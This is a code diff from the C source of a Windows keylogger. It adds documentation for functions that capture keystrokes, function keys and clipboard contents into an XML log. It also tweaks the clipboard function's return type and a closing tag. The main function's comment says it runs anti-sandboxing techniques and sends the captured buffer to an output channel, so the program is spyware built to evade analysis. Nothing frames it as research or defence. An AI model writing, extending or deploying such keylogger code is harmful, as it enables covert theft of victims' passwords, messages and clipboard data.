@@ -151,6 +151,28 @@ FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
 
     }
 }
+/**
+    Title: GrabKey,
+    Description: takes the logged key state buffer, two possibilities that can be toggled by the shift key, and the
+    last key stroke that was logged, this function then determines if that key state can be logged at
+    this time. if it can then it registers a flag to stop processing further. after this event is completed
+    this function will log the key stroke to the global buffer for output in the next shift of user focus.
+
+     @param VkPrimary, the virtual key state that was registered by the calling program.
+
+            Type: int.
+
+     @param Primary, this is the output to be placed in the buffer in the event that the shift key has not been toggled
+            Type: char
+
+     @param Secondary, this is the output to be placed in the buffer in the event that the shift key has been toggled.
+            Type: char
+
+     @param LastKeyStrokeLogged, this is the keystate that was last written to the buffer.
+
+     @return LastKeyStrokeLogged, if the provided key stroke was logged then VkPrimary, else the value of LastKeyStroke
+            Logged is returned unaffected.
+*/
 
 FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyStrokeLogged)
 {
@@ -237,7 +259,24 @@ FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyS
            }
    return LastKeyStrokeLogged;
 }
+/**
+    Title: GrabFunckKey, Grab the key state of function keys, these keys are items such as
+    delete,shift,control, this function takes a a character relating to the function key
+    being grabbed and determines if it should be logged to the buffer, if it should then this
+    function will update the global flag to indicate that a char was grabbed, then it will
+    map to the buffer a string that represents the function key being logged.
 
+    @param FunctionKey, the keystroke that was logged.
+           Type: char
+
+    @param strOut, the desired string representation of the key-state being logged.
+            Type: char*
+    @param lastKeyStrokeLogged, which is the state of the keystate that was previously logged
+            Type:int
+
+    @return LastKeyStrokeLogged, if the provided key stroke was logged then VkPrimary, else the value of LastKeyStroke
+            Logged is returned unaffected.
+*/
 FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogged )
 {
     /*
@@ -314,8 +353,36 @@ FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogg
 
     return LastKeyStrokeLogged;
 }
+/**
+    name: grabclipboard
+    Description: attempts to open the clipboard, if this fails their is likely another process
+    with a handle to it, ignore clipboard during the current iteration. else lock the clipboard
+    to prevent corruption, check to ensure their is data in the clipboard, if their is not then
+    close the clipboard and release the lock else, copy the data, compare the data in the clipboard
+    with data previously logged, if the data has not changed then close the clipboard and release the
+    global lock, otherwise, allocate memory for clipboard data and preform a copy of clipboard data
+    to the allocated buffer, close the clipboard, release the lock, and write the contents of the clipboard
+    to the global buffer.
+    the format of the global buffer output will appear as follows.
 
-FORCEINLINE int grabclipboard()
+            ]]></Capture>
+        </logged>
+        <logged>
+            <CaptureType>ClipBoard</CaptureType>
+            <Capture>
+
+                    .......
+           ></Capture>
+        </logged>
+        <logged>
+            <CaptureType>Keylogger</CaptureType>
+            <Capture><![CDATA[" );
+
+
+
+
+*/
+FORCEINLINE void grabclipboard()
 {
     /*
         attempt to open the clipboard,
@@ -353,7 +420,7 @@ FORCEINLINE int grabclipboard()
                     {
                         GlobalUnlock(cb_lock_handle);
                         CloseClipboard();
-                        return 0;
+                        return ;
                     }
                     /*
                         first check that last_cb_data  has been set, if not then continue processing the cb data,
@@ -382,7 +449,7 @@ FORCEINLINE int grabclipboard()
                                 "]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>\n\t\t\t\t<Capture>");
                          current_process_data = writeSanitizedBuffer(current_process_data,(char*)this_cb_data);
                          current_process_data = writeUnsanitizedBuffer(current_process_data,
-                                "</Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" );
+                                "]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" );
 
                     }
                     /*
@@ -393,8 +460,30 @@ FORCEINLINE int grabclipboard()
                 }
             CloseClipboard();
         }
-    return 0;
 }
+/**
+    name: main
+    Description: entry point for execution, set up the buffers for global writing for future use,
+    execute anti-sandBoxing techniques, register the xml header to the global buffer.
+
+                <?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>
+
+    execute setup of other variables before entering the main loop.
+
+    the main loop should set the global gotchar to true, this program should check that the foreground process has not changed
+    before iterating important elements of the ascii table, if the foreground process has changed this process should complete necessary xml tags
+    necessary to complete the process. thous tags are as follows.
+
+                        ]]></Capture>
+                    </logged>
+                </title>
+            </Process>
+    this process should then write a null terminating character to the output buffer before registering it to the proper
+    output channel, finally, this process will reset the buffer to its default state.
+
+    after each iteration through this program will check the clipboard for changes.
+    this program will never reach its exit.
+*/
 
 int main()
 {
